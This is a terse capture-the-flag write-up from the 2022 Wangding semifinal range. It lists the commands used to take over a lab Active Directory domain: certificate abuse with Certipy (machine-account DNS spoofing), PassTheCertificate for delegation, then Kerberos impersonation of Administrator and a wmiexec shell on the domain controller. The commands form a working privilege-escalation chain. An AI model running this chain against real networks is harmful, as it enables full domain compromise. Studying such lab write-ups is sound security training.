网鼎2022 半决赛靶场
```sh
# flag04
pip3 install certipy-ad

proxychains certipy account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user Test2 -pass Test1234 -dns 'XR-DC01.xiaorang.lab'
proxychains certipy req -u Test2\$@xiaorang.lab -p Test1234 -target 172.22.15.18 -ca "xiaorang-XR-CA-CA" -template Machine
proxychains certipy auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug

certipy cert -pfx xr-dc01.pfx > cert.pem

# 密码为Test1234
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# 在远程桌面机器上复制 PassTheCertificate 和  cert.pfx 后执行

PassTheCertificate.exe -CertPath .\cert.pfx -CertPassword Test1234 -MachineAccount Test3$ -MachinePassword Test1234 -Target "CN=XR-DC01,OU=Domain Controllers,DC=xiaorang,DC=lab"

kali:
配置 hosts
sudo vi /etc/hosts
172.22.15.35 XR-0687.xiaorang.lab
172.22.15.13 XR-DC01.xiaorang.lab 

proxychains impacket-getST xiaorang.lab/Test3\$:Test1234 -dc-ip 172.22.15.13 -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator

export KRB5CCNAME=Administrator.ccache  
proxychains impacket-wmiexec -k XR-DC01.xiaorang.lab  -dc-ip 172.22.15.13 -no-pass
```
